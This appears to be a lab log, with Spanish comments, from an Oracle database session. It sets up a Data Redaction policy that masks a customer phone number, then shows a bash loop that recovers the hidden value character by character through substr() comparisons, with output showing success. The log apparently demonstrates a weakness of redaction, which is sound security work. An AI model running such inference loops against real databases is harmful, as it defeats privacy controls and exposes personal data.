create user user1 identified by AaZZ0r_cle#1;
create user user2 identified by AaZZ0r_cle#1;
grant dwrole to user1;
grant dwrole to user2;
alter user user1 quota unlimited on DATA;
alter user user2 quota unlimited on DATA;

### Como user1:

SQL> show user
USER is "USER1"
SQL> create table customers as select * from sh.customers;

Table created.

SQL> grant select on customers to user2;

Grant succeeded.


SQL> desc customers
 Name					   Null?    Type
 ----------------------------------------- -------- ----------------------------
 CUST_ID				   NOT NULL NUMBER
 CUST_FIRST_NAME			   NOT NULL VARCHAR2(20)
 CUST_LAST_NAME 			   NOT NULL VARCHAR2(40)
 CUST_GENDER				   NOT NULL CHAR(1)
 CUST_YEAR_OF_BIRTH			   NOT NULL NUMBER(4)
 CUST_MARITAL_STATUS				    VARCHAR2(20)
 CUST_STREET_ADDRESS			   NOT NULL VARCHAR2(40)
 CUST_POSTAL_CODE			   NOT NULL VARCHAR2(10)
 CUST_CITY				   NOT NULL VARCHAR2(30)
 CUST_CITY_ID				   NOT NULL NUMBER
 CUST_STATE_PROVINCE			   NOT NULL VARCHAR2(40)
 CUST_STATE_PROVINCE_ID 		   NOT NULL NUMBER
 COUNTRY_ID				   NOT NULL NUMBER
 CUST_MAIN_PHONE_NUMBER 		   NOT NULL VARCHAR2(25)
 CUST_INCOME_LEVEL				    VARCHAR2(30)
 CUST_CREDIT_LIMIT				    NUMBER
 CUST_EMAIL					    VARCHAR2(50)
 CUST_TOTAL				   NOT NULL VARCHAR2(14)
 CUST_TOTAL_ID				   NOT NULL NUMBER
 CUST_SRC_ID					    NUMBER
 CUST_EFF_FROM					    DATE
 CUST_EFF_TO					    DATE
 CUST_VALID					    VARCHAR2(1)

SQL> 


BEGIN
SYS.DBMS_REDACT.ADD_POLICY(
object_schema=> 'USER1',
object_name => 'CUSTOMERS',
column_name => 'CUST_MAIN_PHONE_NUMBER',
column_description => 'Phone number',
policy_name => 'POL_HIDE_PHONE_NUMBER',
policy_description => 'Hide phone number',
function_type => DBMS_REDACT.PARTIAL,
function_parameters => DBMS_REDACT.REDACT_CCN16_F12,
expression => 'SYS_CONTEXT(''USERENV'',''SESSION_USER'') = ''USER2''');
end;
/


ERROR at line 9:
ORA-06550: line 9, column 19:
PLS-00201: identifier 'DBMS_REDACT' must be declared
ORA-06550: line 2, column 1:
PL/SQL: Statement ignored

=> Esto falla como user1 !!!


#### Como ADMIN:

begin

SYS.DBMS_REDACT.DROP_POLICY(
object_schema=> 'USER1',
object_name => 'CUSTOMERS',
policy_name => 'POL_HIDE_PHONE_NUMBER'
);
END;
/

BEGIN
SYS.DBMS_REDACT.ADD_POLICY(
object_schema=> 'USER1',
object_name => 'CUSTOMERS',
column_name => 'CUST_MAIN_PHONE_NUMBER',
column_description => 'Phone number',
policy_name => 'POL_HIDE_PHONE_NUMBER',
policy_description => 'Hide phone number',
function_type => DBMS_REDACT.PARTIAL,
function_parameters => DBMS_REDACT.REDACT_CCN16_F12,
expression => 'SYS_CONTEXT(''USERENV'',''SESSION_USER'') = ''USER2''');
end;
/

PL/SQL procedure successfully completed.

=> OK !!!!


[opc@clicn01 ~]$ sqlplus user1/AaZZ0r_cle#1@adw4sdudb_medium

SQL*Plus: Release 18.0.0.0.0 - Production on Thu Dec 20 10:03:50 2018
Version 18.3.0.0.0

Copyright (c) 1982, 2018, Oracle.  All rights reserved.

Last Successful login time: Thu Dec 20 2018 09:59:05 +00:00

Connected to:
Oracle Database 18c Enterprise Edition Release 12.2.0.1.0 - 64bit Production

SQL> 
SQL> 
SQL> set lines 140
SQL> select cust_id, CUST_FIRST_NAME, CUST_LAST_NAME, CUST_GENDER,CUST_MAIN_PHONE_NUMBER from user1.customers where cust_id = 49671;

   CUST_ID CUST_FIRST_NAME	CUST_LAST_NAME				 C CUST_MAIN_PHONE_NUMBER
---------- -------------------- ---------------------------------------- - -------------------------
     49671 Abigail		Ruddy					 M +34123456

SQL> exit
Disconnected from Oracle Database 18c Enterprise Edition Release 12.2.0.1.0 - 64bit Production

[opc@clicn01 ~]$ sqlplus user2/AaZZ0r_cle#1@adw4sdudb_medium

SQL*Plus: Release 18.0.0.0.0 - Production on Thu Dec 20 10:04:10 2018
Version 18.3.0.0.0

Copyright (c) 1982, 2018, Oracle.  All rights reserved.

Last Successful login time: Thu Dec 20 2018 09:53:48 +00:00

Connected to:
Oracle Database 18c Enterprise Edition Release 12.2.0.1.0 - 64bit Production

SQL> set lines 140
SQL> 
SQL> select cust_id, CUST_FIRST_NAME, CUST_LAST_NAME, CUST_GENDER,CUST_MAIN_PHONE_NUMBER from user1.customers where cust_id = 49671;

   CUST_ID CUST_FIRST_NAME	CUST_LAST_NAME				 C CUST_MAIN_PHONE_NUMBER
---------- -------------------- ---------------------------------------- - -------------------------
     49671 Abigail		Ruddy					 M ****-****

SQL> 

str=""
time for l in `seq $(echo "select length(CUST_MAIN_PHONE_NUMBER) from user1.customers where cust_id=49671;" | sqlplus user2/AaZZ0r_cle#1@adw4sdudb_medium | grep -A2 LENGTH | grep [0-9])`
do
    for i in `seq 256`
    do
        resp=$(echo "select 'CCCP' as myresponse from user1.customers where substr(CUST_MAIN_PHONE_NUMBER,$l,1)=chr($i) and cust_id=49671;" | sqlplus user2/AaZZ0r_cle#1@adw4sdudb_medium | grep CCCP | wc -l)
    if ! [ $resp -eq 0 ]
    then
        str=${str}$(echo $i | awk '{ printf("%c",$0); }') 
        echo ${str}
    fi
    done
done
echo "Final result: "$str

+
+3
+34
+341
+3412
+34123
+341234
+3412345
+34123456

real	5m52.622s
user	2m20.528s
sys	0m46.318s
[opc@clicn01 ~]$ echo "Final result: "$str
Final result: +34123456

